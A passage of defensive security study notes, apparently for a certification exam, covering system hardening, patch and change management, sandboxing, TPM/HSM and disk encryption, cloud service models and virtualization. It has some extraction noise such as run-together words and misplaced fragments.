free articles, documentation, tools, and more on web application security.
prototyping Creating a version of an application that has only the bare minimum func- tionality so that it can be evaluated before further development.
sandboxing Operating in an isolated environment.
script kiddy An attacker with very minimal skills.
secure coding Programming in a manner that is secure.
stored procedures SQL statements written and stored on the database that can be called by applications.
stress testing Subjecting a system to workloads that are extreme.
Structured Query Language (SQL) The language used by all relational databases.
waterfall method A software development method that uses very well-defined sequen- tial phases. patch for it.
Secure Systems
Secure systems design concepts: ensure that computing systems are deployed and maintained in a secure state.
computing systems: any host (server, workstation, laptop, network device, mobile device...)
administrators need to be proactive to secure systems before deployment and keep them secure after deployment.
This section outlines several steps used to secure hosts.
The process of secure OS configuration involves:
Disabling default accounts/passwords
Keeping the system up to date via updates and patches Disabling unnecessary ports and services
Application whitelisting/blacklisting
Hardening: the practice of making an OS or app more secure from its default installation.
It helps eliminate vulnerabilities from default configurations, misconfigurations, and weak configurations.
least functionality:
  One of the elements of secure computer system design is the
principle of least functionality. A core principle associated with secure systems design.
Disabling unnecessary services to reduce vulnerabilities.
  - Systems should be deployed with only the applications, services, and protocols they need to meet their purpose.
  - If a service or protocol is not running on a system, attackers cannot attack it.
  - Example:
  - system is not vulnerable to any File Transfer Protocol (FTP)
attacks if FTP is not running and available on the system.
uninstall unneeded software.
  - Software frequently has bugs and vulnerabilities.
  - patching software closes vulnerabilities, but you can eliminate these
vulnerabilities by simply eliminating unneeded applications.
  - Example:
  - small training company. One of the servers had a default configuration for Windows that resulted in a significant vulnerability.
  - using the server as a file server, but because it wasn’t hardened from the default configuration, it was also running Internet Information Services (IIS), the Microsoft web server.
  - attackers released the Nimda virus exploited a vulnerability with IIS.
  - Microsoft released a patch for IIS, but because IIS was installed by default and we weren’t using it, we also weren’t managing it.
  - Ultimately, the Nimda virus found server, and the worm component of Nimda quickly infected our network.
  - If the IIS software hadn’t been installed, the server would not have been vulnerable to the attack. disable unnecessary accounts.
  - Example:
  - the Guest account is disabled by default in current Windows systems
and it should remain disabled unless there is a specific need for it. Some applications also include backdoor accounts. System has default account
  - A backdoor is an access point to an application or service that bypasses normal security mechanisms.
  - Developers use backdoors for legitimate purposes to view the internal workings of an application or for ease of administration.
  - However, the use of backdoors is discouraged in the final released version.
  - If a backdoor exists, you can expect attackers to locate and exploit it.
  - Similarly, if a system or application has a default account with a
default password, the password should be changed.
Operating Systems
There are three primary types of computer operating systems (OSs): Windows,
Apple’s operating systems,
Linux- or Unix-based systems.
Within these types, there are many different versions.
the Windows operating system includes: Windows Server 2012 and Windows Server 2016
versions for desktop workstations (including laptops):Windows 8 and Windows 10
Windows operating systems are closed source software, meaning that the underlying code is not freely available to the public. Microsoft developed these OSs and updates them.
Apple:
macOS for its Macintosh computers and iOS as a mobile OS
also uses closed source OSs, only Apple updates or modifies these OSs.
Linux:
derived from Unix
open source, freely available to anyone.
Developers have access to the code and can modify, improve, and, at times, freely redistribute it.
Because of this, there is an almost endless assortment of Linux versions. Example:
  - Android OS, open source software, derived from the Linux OS.
  - Additionally, many mobile device manufacturers modify the Android
OS and use it as a mobile OS for their devices.
It’s worth noting that the use of Linux in many systems has steadily increased.
OSs operating on desktops, laptops, servers, and other locations,including:
Kiosks: 公用电话亭, 小摊棚  ⁃
  - small structure in an open area used to sell something, provide
information, or display advertisements.
  - Example, an organization can create a touch-screen application installed on a computer and place it in a kiosk. a mall or store (designed to advertise something), in a medical center (designed to share information), or anywhere an organization thinks it might be useful.
Network:
  - Many network devices (switches, routers, firewalls) include an operating system used to manage the device.
  - These are often a version of Linux.
  - Some Cisco network devices use the Cisco IOS (Internetwork
Operating System).
Appliance:
  - A network appliance is a dedicated hardware device that bundles several features within it.
  - Example: unified threat management (UTM) device that includes multiple layers of protection. Many appliances run on a Linux version. non-persistent operating system:
use live boot media to create a non-persistent operating system on a computer.
Example,
the Defense Information Systems Agency (DISA) uses Bootable Media
(BootMe):
  - a CD that authorized Department of Defense (DoD) users to run an operating system on almost any computer.
It provides users with an operating system to perform specific functions, such as accessing DoD resources via remote access.
non-persistent: disappears when users turn off the computer.
Secure Operating System Configurations
administrators must take specific steps to secure OS.
A common method of deploying systems: create master image with a secure configuration, deploy the image to multiple systems.
A trusted operating system meets a set of predetermined requirements with a heavy emphasis on authentication and authorization.
ensurethatonlyauthorizedpersonnelcanaccess data based on their permissions.
prevents modifications or movement of data by unauthorized entities. prevent malicious software (malware) infections as it prevents malicious or
suspicious code from executing.
A trusted OS meets a high level of security requirements imposed by a third party. Example: the Common Criteria for Information Technology Security Evaluation (or simply Common Criteria) includes requirements for a trusted OS.
Operating systems that meet these requirements can be certified as trusted operating systems.
Also, a trusted OS typically uses the mandatory access control (MAC) model Using Master Images
One of the most common methods of deploying systems: master image.
An image is a snapshot of a single system that administrators deploy to multiple
other systems.
Imaging: important practice for many organizations because it streamlines
deployments while ensuring they are deployed in a secure manner.
Capturing and deploying images
 1. Administrators start with a blank source system.
  - They install and configure the operating system, install and configure
any desired applications, and modify security settings.
  - Administrators perform extensive testing to ensure the system works as desired and that it is secure before going to the next step.
2. administrators capture the image, which becomes their master image.
  - Symantec Ghost is a popular imaging application, and Windows Server versions include free tools many organizations use to capture and deploy images.
  - Image: a file that can be stored on a server or copied to external media (DVD, USB drive...)
3. administrators deploy the image to multiple systems.
  - When used within a network, administrators can deploy the same image to dozens of systems during an initial deployment, or to just a single system to rebuild it.
  - The image installs the same configuration on the target systems as the original source system created in step 1.
Administrators will often take lots of time to configure and test the source system. They follow the same hardening practices discussed earlier and often use security and configuration baselines.
image to just a few systems (classroom...) they may create the image in just a few hours.
However, if they’re deploying it to thousands of systems within an organization, they may take weeks or months to create and test the image.
Once they’ve created the image, they can deploy it relatively quickly with very little administrative effort. Imaging 2 important benefits: Secure starting point:
  - The image includes mandated security configurations for the system.
  - Personnel who deploy the system don’t need to remember or follow extensive checklists to ensure that new systems are set up with all the detailed configuration and security settings.
  - The deployed image retains all the settings of the original image.
  - Administrators will still configure some settings, such as the computer
name, after deploying the image.
Reduced costs.
  - Deploying imaged systems reduces maintenance costs and improves reliability.
  - Support personnel don’t need to learn several different end-user system environments to assist end users. Instead, they learn just one.
  - When troubleshooting, support personnel spend their time focused on helping the end user rather than trying to learn the system configuration.
  - Managers understand this as reducing the total cost of ownership (TCO) for systems.
Many virtualization tools include the ability to convert an image to a virtual system.
image, you can deploy it to either a physical system or a virtual system. Imaging: desktop computers, any system, including servers.
  - Example:
  - organization that maintains 50 database servers in a large data center.
  - The organization can use imaging to deploy new servers or as part of its disaster recovery plan to restore failed servers.
  - much quicker to deploy an image to rebuild a failed server than it is to rebuild a server from scratch.
  - keep the images up to date, helps ensure the recovered server starts in a secure state.
Resiliency and Automation Strategies
Resiliency 弹性 and automation strategies:
include automation, scripting, and templates
help deploy systems securely, and keep them in a secure state.
Example:
administrators often use Group Policy in Microsoft domains to automatically check and configure systems.
It provides automated courses of action by applying security and other settings.
Additionally, Microsoft has created several security templates with various levels of security.
Administrators can modify these templates to fit their needs, import them into a Group Policy Object (GPO), and then apply them to systems within the domain.
Some organizations deploy a master image to all systems
and then use the security templates: automatically apply different security settings to different groups of systems based on their security needs.
Secure Baseline, Integrity Measurements
Secure Baseline: known starting point - organizations commonly use secure baselines to provide known starting points for systems.
- Benefits
  - improve the overallsecurity posture of systems.
  - help eliminate weak security configuration
The use of baselines works in three steps:
1. Initial baseline configuration.
  - Administrators use various tools to deploy systems consistently in a secure state.
2. Integrity measurements for baseline deviation. 偏离
  - the administrators performed integrity measurements to identify
baseline deviations.
  - Automated tools monitor the systems for any baseline changes (common security issue)
  - Some tools:
  - vulnerability scanners: monitor the systems, report changes
detected.
  - Group Policy: automatically reconfigure the systems to the baseline settings when they detect changes.
1. Remediation 纠正.
  - NAC methods can detect some changes to baseline settings
  - automatically isolate or quarantine systems in a remediation network.
  - Typically, administrators need to correct the problems in these systems manually. Patch Management
operating systems and applications include millions of lines of code, testing simply doesn’t find all the problems.
Instead, test software before releasing it.
Later, as problems crop up, companies write and release patches or updates.
Administrators must apply these patches to keep their systems up to date and protected against known vulnerabilities.
Patch management:
ensures that systems and applications stay up to date with current patches.
one of the most efficient ways to reduce operating system and application vulnerabilities because it protects systems from known vulnerabilities.
Patch management includes a group of methodologies and includes the process of identifying, downloading, testing, deploying, and verifying patches.
After testing the patches, administrators deploy them, not manually. use systems management tools to deploy the patches in a controlled manner.
  - Example: Microsoft System Center Configuration Manager (SCCM / ConfigMgr) is a systems management tool used for many purposes, including patch management.
systems management tools also include a verification component that verifies patch deployment.
  - periodically query the systems, retrieve a list of installed patches and updates.
  - then compare the retrieved list with the list of deployed patches and updates, providing reports for any discrepancies.
  - In some networks, administrators combine this with network access control (NAC) technologies and isolate unpatched systems in quarantined networks until they are patched.
Change Management Policy
The worst enemies of many networks have been unrestrained administrators.
A well- meaning administrator can make what appears to be a minor change to fix
one problem, only to cause a major problem somewhere else.
A misconfiguration can take down a server, disable a network, stop email
communications, and even stop all network traffic for an entire enterprise.
Example:
A major outage occur when an administrator was troubleshooting a printer problem.
After modifying the printer’s Internet Protocol (IP) address, the printer began to work.
Unfortunately, the new IP address was the same IP address assigned to a Domain Name System (DNS) server, and it created an IP address conflict.
The conflict prevented the DNS server from resolving names to IP addresses. This resulted in a major network outage until another administrator discovered and corrected the problem.
organizations with mature change management processes in place have fewer of these problems.
Change management: defines the process for any type of system modifications, upgrades, including changes to applications, and accounting structure for handling modifications and upgrades.
It provides two key goals:
  - ensure changes to IT systems do not result in unintended outages
  - provide an accounting structure or method to document all changes
When a change management program is in place, administrators follow the change management process before making a change.
Experts from different areas of an organization examine change requests and can either approve or postpone them.
The process usually approves simple changes quickly.
A formal change review board regularly reviews postponed requests and can approve, modify, or reject the change.
This entire process provides documentation for approved changes. Example:
  - automated change management systems create accounting logs for all change requests.
  - The system tracks the request from its beginning until implementation.
  - Administrators use this documentation for configuration management
and disaster recovery.
  - If a modified system fails, change and configuration management documentation identifies how to return the system to its prefailure state.
Unauthorized Software Compliance Violations
A common security issue is the use of unauthorized software, which can cause many different problems.
unauthorized software often includes malware.
IT department personnel can’t be experts on everything, so1 this takes them away from other tasks.
Another common security issue related to the use of unauthorized software is license compliance violations.
Example
an organization purchases 10 licenses for an application.
Nineusershavethisinstalledandhaveactivatedit ontheirsystems.
Bartdiscoversthekeyanddecidestoinstallthesoftwareon hiscomputer,even though he doesn’t need it for his job.
Later, the organization hires Maggie. IT personnel set her up with a new computer and try to activate the application, but it fails because the tenth license is already in use.
This results in a loss of availability of the application for Maggie.
Some applications verify the key is valid, but they don’t necessarily check to see if the key is already in use.
If IT personnel successfully install and activate the software on Maggie’s computer, it results in a loss of integrity for the organization’s license compliance.
The organization can be susceptible to fines / penalties if the application developer discovers that the organization is violating the license requirements.
App Whitelisting Blacklisting
application whitelist: a list of app authorized to run on a system. applicationblacklist:alistofapp thesystemblocks.
You can use Software Restriction Policies in Microsoft Group Policy for both whitelisting and blacklisting for computers within a domain.
Fora whitelist,youidentifytheapplicationsthatcanrunonthesystem,andGroup Policy blocks all other applications.
For a blacklist, you identify the applications that cannot run on the system, and Group Policy allows any other applications.
Similarly, many mobile device management (MDM) applications use application whitelists and blacklists to allow or block applications on mobile devices.
Messages that users see when they can’t install an application due to whitelisting or blacklisting are sometimes cryptic.
When users try to install an application that isn’t on the whitelist, it will often report a permission issue or sometimes just fail with a vague error.
However, application logs will typically include details on why the installation failed.
Secure Staging and Deployment Sandboxing with VMs
Sandboxing:
use of an isolated area on a system
often used to test various security controls before deploying them to a live production network.
  - Virtualization provides a high level of flexibility when testing security controls because the environments are easy to re-create.
  - Example, they can test the effectiveness of antivirus software to detect malware released within a sandbox. If the antivirus software doesn’t detect the malware and the malware causes problems, it is easy to revert the system to a previous state. Also, the isolation within the sandbox prevents the malware from spreading.
useful for testing patches.
  - Example:
  - software vendors updates and patches, but they need to test them in various environments before releasing them.
  - They could create VMs for multiple operating systems. When they’re ready to test, they turn on one of the VMs, take a snapshot, and then apply and test the patch. If the patch causes a problem, they can easily revert the VM.
Sandboxing with Chroot
Linux-based chroot command.
Another method of sandboxing
It is used to change the root directory for an application, effectively isolating it. Normally, the root of Linux is designated as / and all other directories can be accessed from here.
Users often have their own home directories within the /home directory.
Example
Lisa’s root directory on a Linux system: /home/lisa.
  - Regular users won’t have access to the root directory, but only to files within their directory.
  - In contrast, a root user / administrator has root access and can access all files and folders on the drive.
Lisa is a root user and wants to test an application within an isolated area.
She could create a directory named testing in her environment.
It would be /home/lisa/testing.
She would copy her application files and copy any other required directories such as the /bin and /lib directories into the sandbox directory.
She would then use chroot to create the isolated sandbox in the testing directory.
  - This sandbox is often referred to as a chroot jail.
any commands she enters can only access files within the /home/lisa/testing directory.
Additionally, her application can only access files with the same path.
If the application is malicious or buggy, it cannot access any system files.
Secure Staging Environment
A secure staging environment includes multiple environments, and typically includes different systems used for each stage. Example
a software development team is creating an application that will be used to sell products via the Internet.
The different environments are:
  - Development environment
  - Software developers use a development environment to create the application.
  - typically includes version control and change management controls to track the application development.
  - Test environment.
  - Testers put the application through its paces and attempt to
discover any bugs or errors.
  - doesn’t simulate a full production environment, but instead includes enough hardware and software to test software modules.
  - Staging environment:
  - simulates the production environment and is used for late stage
testing.
  - It provides a complete but independent copy of the production environment.
  - Production environment:
  - the final product.
  - It includes everything needed to support the application and allow customers and others to use it.
  - In this example, it would include the live web server, possibly a back-end database server, and Internet access. Secure systems design: includes secure staging and deployment. Peripherals 外围设备
When implementing secure systems design, organizations should consider the use of various computer peripherals, including the following:
Wireless keyboards and wireless mice.
  - Wireless transmissions can sometimes be intercepted.
  - If processing sensitive data, use wired devices instead. Displays.
  - If displays show sensitive or private data, their view should be limited.
  - E xample:
  - shouldn’t be viewable from windows.
  - privacy screens can be placed over displays to limit the view of the information unless someone is looking straight at the display.
External storage devices
  - External storage devices include any external device that has memory capabilities.
  - It typically refers to external USB drives, but also includes other devices such as smartphones, tablets, MP3 players, and digital cameras.
  - Users can copy data to and from a system.
  - They can transport malware without the user’s knowledge and can be a
source of data leakage.
  - Malicious users can copy and steal a significant amount of information using an easily concealable thumb drive.   - Also, users can misplace these drives and the data can easily fall into the wrong hands.
  - Many organizations block the use of any external devices using technical policies.
Digital cameras.
  - Digital cameras typically include built-in storage and support additional storage by plugging in a memory card.
  - These include the same risks as any external storage device. Wi-Fi-enabled MicroSD cards.
  - Traditional Micro Secure Digital (SD) cards need to be plugged into a port to read the data. They are typically used in digital cameras.
  - However, newer MicroSD cards include wireless capabilities. As with any wireless devices, the risk is that wireless transmissions can be intercepted, so if these are necessary, they should be configured with strong wireless security.
multi-function devices (MFDs)
  - MFDs: extra features should be considered, especially if they will
process sensitive information.
  - These typically have embedded systems with their own risks.
  - Additionally, they often have internal storage that might retain documents that they process.
  - Example
  - Device copy or scan a document, a copy of the document might
remain in the system’s internal memory. Hardware and Firmware Security
Whenimplementingsecuresystemsdesign,it’salsoimportanttoevaluate several hardware elements, including those covered in this section.
Additionally, an organization should evaluate the supply chain. A supply chain includes all the elements required to produce a product. In secure systems design, the product is a secure system.
There have been many incidents where new computers were shipped with malware.
Example:
Microsoft researchers purchased several new computers in China and found them infected with the Nitol virus. These computers were also running counterfeit versions of Windows.
the importance of purchasing computers from reputable sources.
electromagnetic interference / pulses (EMI/EMP)
Systems must also be protected against EMI/EMP.
In most environments is small concern.
However, computers are susceptible to electronic interference. EMI: comes from sources: motors, power lines, fluorescent lights, it can interfere with signals transmitted over wires.
 EMI shielding
  - Protection:
interference, Eavesdropping EMP: a short burst of electromagnetic energy.
Outside
  - protects the transferred data signals:
  - EMP can come from a wide assortment of sources and some sources can cause damage to computing equipment. Some sources include:
  - Electrostatic discharge (ESD):
  - Basic ESD prevention practices: ESD wrist straps, help prevent
ESD damage.
  - Lightning:
  - Lightning pulses can go through electrical wires and damage
unprotected systems.
  - Surge protection methods: surge protection strips, protect electrical systems.
  - Military weapons.
  - Nuclear explosions create a large EMP that can damage electronic equipment (including embedded systems) over a large area.
  - Some non-nuclear weapons have been designed to mimic the nuclearEMP,butwithoutthenuclearexplosion.
  - Non- nuclear EMP has a smaller range than nuclear EMP, but can still damage equipment.
  - Protection: turn equipment off, but you’re unlikely to know when one of these explosions will occur. ▪


## At the simplest level, keeping devices and processes that might produce EMI/EMP away from systems.
In more secure environments, taking steps to prevent EMI/EMP from penetrating a room with computers.
A common way to do this is via a Faraday cage.
  - essentially metal meshes that prevent electromagnetic signals from
penetrating.
  - The U.S. government, particularly the Department of Defense, uses secure compartmented information facilities (SCIFs), wherein the room or building itself is a Faraday cage.
FDE, SED
one critical aspect of secure systems is the issue of encrypted data. There are many options today for encrypting a hard drive.
applications of cryptography:
Full disk encryption (FDE):
  - encrypting the entire disk, rather than a specific file or folder.
  - (not be automatic)
  - recommended for full security of the system.
  - Windows: since Windows 7, offers BitLocker on the professional and higher versions of its operating system.
  - open source encryption solutions: VeraCrypt, allow to encrypt 2,783

▪
partitions or entire drive.
Many hardware vendors now manufacture hardware-based FDE drives. also
referred to as self-encrypting drives (SEDs).
self-encrypting drive (SED):
  - encrypt the hard drive of laptops in her organization. The encryption and
decryption will be automatic.
  - has a controller chip built into it.
  - includes the hardware and software to encrypt all data on the drive and securely store the encryption keys.
  - allow users to enter credentials when they set up the drive.
  - When users power up the system, they enter their credentials
again to decrypt the drive and boot the system.
  - automatically encrypts the drive and decrypts it, provided the proper password is entered.
  - The encryption key used in SEDs: media encryption key (MEK).
  - Locking / unlock drive requires another key: key encryption key (KEK),
supplied by the user.
  - The KEK is used to decrypt the MEK, which in turn is what encrypts and decrypts the drive.
Hardware Security Module
Hardware security modules (HSMs):
     - a data storage device equipped with a hardware-level encryption functionality
   - security devices that handle digital keys.
  - can add to a system to manage, generate, and securely store
cryptographic keys.
  - They can be used to facilitate encryption as well as authentication via
digital signatures.
  - Most HSMs support tamper-resistant mechanisms.
High- performance HSMs: are external devices connected to a network using TCP/
IP.
Smaller HSMs: expansion cards install within a server, or devices plug into computer ports.
HSMs support the security methods as a TPM.
  - provide a hardware root of trust, secure boot, and can be configured for remote attestation.
Differences HSM vs TPM:
HSM: removable or external devices.
  - can easily add an HSM to a system or a network TPM: chip embedded into the motherboard.
  - If system didn’t ship with a TPM, it’s not feasible to add one later. Both HSMs and TPMs provide secure encryption capabilities by storing and using
RSA keys.
Many high-performance servers use HSMs to store and protect keys.
   - a plugin-in card used for secure management, processing and storage of cryptographic keys UEFI and BIOS
In addition to securing drives, the system BIOS or UEFI must be secured.
- BIOS (basic input/output system)
  - was the older method for handling bootup information for a computer.
  - includes software provides a computer with basic instructions on how to start.
  - runs some basic checks, locates the operating system, and starts.   - The BIOS is often referred to as firmware.
  - The combination of hardware and software is firmware.
  - It is a hardware chip on motherboard and it includes software
that executes code on the computer.
- UEFI (Unified Extensible Firmware Interface) is the more modern technique.
  - performs many of the same functions as BIOS
  - provides some enhancements. newer and better features.
  - Example, it can boot from larger disks and it is designed to be CPU-independent. when booting up.
  - For this reason, you should always ensure the access to either BIOS or
UEFI is password protected.
- Both BIOS and UEFI can be upgraded using a process called flashing.
  - Flashing: overwrites the software within the chip with newer software.
Secure boot
a process whereby the BIOS or UEFI makes a cryptographic hash of the operating system boot loader and any boot drivers and compares that against a stored hash.
This is done to prevent rootkits, boot sector viruses.
The stored hash is often protected or encrypted by a TPM.
remote attestation. 证词
Another option, to store the hash in some secure server remote from the computer
being protected.
root of trust (RoT)
Another aspect of secure system design
a security process that has to begin with some unchangeable hardware identity often stored in a TPM.
From this confirmed identity, each layer of the system, starting with BIOS/UEFI, on to the operating system and beyond, is validated upon startup to ensure that no tampering has occurred. Trusted Platform Module (TPMs):
dedicated processors that use cryptographic keys to perform a variety of tasks.   - Example, they can be used to authenticate devices.
TPMs can also be used to facilitate FDE.
Usually a TPM will be on the motherboard of the computer.
a hardware chip on the computer’s motherboard
stores cryptographic keys used forencryption.
Many laptop computers include a TPM, but if the system doesn’t include a TPM, it isnot feasible to add one.
Once enabled, the TPM provides full disk encryption capabilities. It keeps hard drives locked, or sealed, until the system completes a system verification and authentication process.
A TPM supports secure boot and attestation processes. secure boot
  - When the TPM is configured, it captures signatures of key files used to boot the computer and stores a report of the signatures securely within the TPM.
  - When the system boots, the secure boot process checks the files against thestored signatures to ensure they haven’t changed.
  - If it detects that the files have been modified, such as from malware, it blocksthebootprocesstoprotectthedata onthedrive.
 Remote attestation: a TPM's capability to check a computer system's integrity against a remote trusted third-party
service. A remote attestation process
  - works like the secure boot process.
  - However, instead of checking the boot files against the report stored in the TPM, it uses a separate system.
  - Again, when the TPM is configured, it captures the signatures of key files, but sends this report to a remote system.
  - When the system boots, it checks the files and sends a current report to the remote system.
  - The remote system verifies the files are the same and attests, or confirms, that the system is safe.
TheTPMshipswithauniqueRivest,Shamir,Adleman(RSA)privatekey burned into it, asymmetric encryption.
This private key is matched with a public key, provides a hardware root of trust / a known secure starting point.
The private key remains private and is matched with a public key.
Additionally, the TPM can generate, store, and protect other keys used for encrypting and decrypting disks.
If the system includes a TPM, you use app within the OS to enable it.
Example
many Microsoft systems include BitLocker, which you can enable for systems that include the TPM.
BitLocker uses the TPM to detect tampering of any critical operating system files or processes as part of a platform verification process.
Additionally, users provide authentication: smart card, a password, or a personal identification number (PIN). The drive remains locked until the platform verification and user authentication processes are complete.
If a thief steals the system, the drive remains locked and protected.
no authentication credentials, can’t access the drive using a normal boot process.
If the attacker tries to modify the operating system to bypass security controls, the TPM detects the tampering and keeps the drive locked.
If a thief moves the drive to another system, the drive remains locked because the TPM isn’t available.
Cloud Computing
National Institute of Standards and Technology (NIST):
3 service models are defined in Special Publication 800-145:
  - Software as a Service (SaaS),
  - Platform as a Service (PaaS),
  - Infrastructure as a Service (IaaS).
4 possible delivery models: private, public, community, and hybrid. Cloud computing: access computing resources via a different location than your local computer. through the Internet.
Example:
web-based email, Gmail
Software as a Service cloud computing service.
Cloud storage: Apple offers iCloud storage, Microsoft offers OneDrive, and Google offers Google Drive.
Heavily utilized systems and networks often depend on cloud computing resources to handle increased loads.
Example
Black Friday,
Amazon.com had so much traffic during the Thanksgiving weekend that its servers could barely handle it.
The company used cloud computing to rent access to servers specifically for the Thanksgiving weekend.
other companies had the same need.
Amazon hosts cloud services: Amazon Elastic Compute Cloud (Amazon EC2) service.
  - combines virtualization with cloud computing.
As a comparison, organizations can also use on-premise or hosted services:
On-premise. All resources are owned, operated, and maintained within the organization’s building or buildings.
Hosted. Organizations can rent access to resources from a specific organization.
the line is blurred between hosted and cloud services. In some cases, you know exactly where the services are hosted. However, in most cases, hosted services are somewhere within the cloud.
maintenance responsibilities and security responsibilities.
 Example: SaaS, Gmail.
  - Google: responsibility for maintaining the app and ensuring it is available. ensuring the security for Gmail.
  - Client: some responsibility, ensuring a strong password. PaaS
  - CSP: provide platform, ensure it remains available. additional security protection (firewalls, malware content filters, IDS...)
  - Customer: operation, configuration, and security of the platform.
IaaS
Software as a Service (SaaS)
use the provider’s app / software running on a cloud infrastructure.
The applications are accessible from client through either client interface (any web
browser, web-based email), or a program interface.
The consumer does not manage or control the underlying cloud infrastructure
  - Including: network, servers, operating systems, storage, or even individual application capabilities, with the possible exception of limited user-specific application configuration settings.
⁃
Example:
Gmail, Yahoo! Mail..
  - provides all the components of email to users via webbrowser. Google Docs:
  - provides access to several SaaS applications,
  - allowing users to open text documents, spreadsheets, presentations,
drawings, and PDF files through a web browser.
  - risk: data is hosted on Google Docs, attackers hack into Google Docs,
  - CSP: least responsibility for an
  - Customer: most responsibility when compared with both PaaS and SaaS.
 offering remote access to applications based on
monthly or annual subscription fee data be compromised.
  Platform as a Service (PaaS)
- Fully managed platform
- deploy onto the cloud infrastructure consumer-created or acquired applications created using programming languages, libraries, services, and tools supported by the provider.
- provides customers with a preconfigured computing platform as needed.
  - an easy-to-configure operating system,
  - combined with appropriate applications   - and on-demand computing.
- The consumer does not manage or control the underlying cloud infrastructure.
  - including network, servers, operating systems, or storage, but has control over the deployed applications and possible configuration settings for the application-hosting environment.
  - Example:
  - a web developer intending to create a web app.
- Many cloud providers refer to this as a managed hardware solution. - Example
- Liquid Web:
  - provides several features in their fully managed solutions,
  - including an installed operating system, a core software package used for web servers, Apache as a web server, antivirus software, spam protection, and more.
  - they keep the operating system up to date with relevant updates and patches.
  - I manage the software used for the web site, (changes and updates)
  - when the server developed a problem, they fixed it.
Infrastructure as a Service (IaaS)
self-managed solution / platform.
provision processing, storage, networks, and other fundamental computing resources
where the consumer is able to deploy and run arbitrary software, which can include operating systems and applications.
IaaS service provider:
   - owns the equipment, houses it in its data center, and performs all the required hardware maintenance.
  - provide access to a server with a default operating system installation Customer: Have the most control over the systems in the cloud.
  - outsource its equipment requirements (hardware and all support operations.) limits its hardware footprint.
  - needs fewer servers in its data center and fewer resources (power, HVAC, personnel to manage the servers)
  - rents access to the equipment and often pays on a per-use basis.
  - customers must configure server, install software based on their needs.
responsible for all operating system updates and patches.
The consumer does not manage or control the underlying cloud infrastructure but has control over operating systems, storage, and deployed applications; and possible limited control of select networking components (e.g., host firewalls).
  - Example: company with aging system unable to keep up with customer demand.
  Anything as a Service (XaaS)
When multiple models are combined—mixing IaaS, PaaS, and/or SaaS into a hybrid.
Security as a Service
a cloud-based security management outsourcing model. any services provided via the cloud that provide security services
as a subset of the SaaS Example:
 antivirus software
  - purchase licenses to access the software
  - configures system to use the software with individual licenses.
  - Once installed, the software automatically downloads virus definitions
keeping each user’s system up to date without relying on the user to
do so.
key benefit:
  - outsources the administrative tasks associated with implementing the service.
  - professionals are focused on the specific security services offered, eliminating the need for employees to be experts on everything.
a subscription-based business model intended to be more cost effective than individuals and smaller corporations could ever get on their own.
With this model, a large service provider integrates their security services into a corporate infrastructure and makes them available on a subscription basis.
Due to economies of scale, the solution is more cost effective when total cost of ownership is factored in.
No on-premise hardware is needed by the subscriber, and the services offered can include such things as authentication, antivirus, antimalware/spyware, and intrusion detection. In this way, SECaaS can serve as a buffer against many online threats.
cloud access security broker (CASB)
additional security for cloud resources
software tool / service deployed between an organization’s network and the cloud
provider.
It monitors all network traffic and can enforce security policies. Example: it can ensure that all data stored in the cloud is encrypted. Private Cloud
The cloud infrastructure is provisioned for exclusive use by a single organization comprising multiple consumers (e.g., business units), they act as both the provider and the consumer.
private cloud is set up for specific organizations.
  - Example:
  - wants to store data in the cloud, but does not want to use a third- party vendor.
  - Instead, host its own servers and make these servers available to internal employees through the Internet.
  - Advantage: not needing to put their data on the Internet.
It may be owned, managed, and operated by the organization, a third party, or some
combination of them, and it may exist on or off premises. Public Cloud
The cloud infrastructure is provisioned for open use by the general public.
  - may be owned, managed, and operated by a business / academic / government / combination of them. It exists on the premises of the cloud provider.
  - Amazon, Google, Microsoft, and Apple.
the cloud provider owns a public cloud, provide similar services to anyone willing
to pay for them. pay-as-you-go model.
  - Examples: webmail and online document sharing/collaboration.
Community Cloud
share cloud resources within a community cloud.
The cloud infrastructure is provisioned for exclusive use by a specific community of consumers from organizations that have shared concerns (e.g., mission, security requirements, policy, and compliance considerations).
  - each provide resources for the cloud
  - only organizations within the community have access to the resources.
It may be owned, managed, and operated by one or more of the organizations in the community, a third party, or some combination of them, and it may exist on or off premises.
Key to distinguishing: community cloud serves a similar group.
  - There must be joint interests and limited enrollment.
  - private cloud as a house (you own it; you’re responsible for the maintenance, utilities...)
  - public cloud as a hotel (you’re using only a small part of it; you have very little responsibility for the structure),
  - community cloud as a condominium (you own a portion, you share maintenance of common areas, and so on).
Hybrid Cloud
The cloud infrastructure is a composition of two or more distinct cloud infrastructures (private, community, or public) that remain unique entities, but are bound together by standardized or proprietary technology that enables data and application portability (e.g., cloud bursting for load balancing between clouds).
These retain separate identities to help protect resources in private clouds. However, they are bridged together, often in such a way that it is transparent to theusers.
Although a hybrid can be any combination of public, private, and community clouds, under most circumstances it is an amalgamation of private and public clouds.
When you start mixing in community clouds, it often becomes more of an extension of the community cloud rather than a hybrid cloud.
One common implementation of cloud computing is to take advantage of cloud bursting. This means that when your servers become too busy, you offload traffic to resources from a cloud provider. Technologies that make much of the load balancing/prioritizing possible employ the QoS (Quality of Service) protocols. Hypervisors
At the core of most virtualization is the hypervisor, which is the software/hardware combination that makes it possible.
There are 2 methods of implementation: Type I and Type II. Type I hypervisor model (bare metal)
independent of the operating system
boots before the OS.
Type II hypervisor model (hosted)
dependent on the operating system
cannot boot until the OS is up and running. It needs the OS to stay up so that it can boot.
  Both proprietary and open source implementations of both types are available, and sometimes it can be confusing as to which type of implementation is in use.
Example:
Xen, forks into both proprietary and open source solutions. As a general rule, Xen is
considered to be both free and open source;
ESX, from VMware, is free but not open source (proprietary);
KVM is free and open source;
and Hyper-V, from Microsoft, is usually free (depending on the implementation) but definitely not open source (proprietary).
ESX is a good example of a type 1 installation while VMWare workstation Microsoft Virtual PC are good examples of type 2.
Understanding Containers and Application Cells
Whereas once it was the case that hypervisors were the only way to have virtualiza- tion, containers are now thought by most to be their successor. Sometimes referred to as “Docker containers,” after the application that introduced the technology, with containers, a piece of software is bundled with everything that it needs to run—code, runtime, system tools, system libraries, and so forth—and deployed without the need to launch an entire VM for each application (which is why application cells is another synonym).
Containers are an operating system–level virtualization method for running multiple isolated systems (the containers themselves) on a control host using a single kernel. This method of virtualization provides an isolated environment for applications.
When first introduced, containers were not as secure a method of virtual- ization as hypervisors, but that quickly changed. Containers now often run as regular users on the host using “unprivileged containers,” which are prevented from accessing hardware directly.
VDI/VDE
virtual desktop environment (VDE):desktop virtualization
the user’s session is run remotely. looks as if the resources like the folders is in system, exist locally, in reality they are all stored and running on a remote server.
Reasons for VDE solutions: including that fully functioning virtual desktops are less expensive than PCs and application management/licensing is simplified.
virtual desktop infrastructure (VDI)
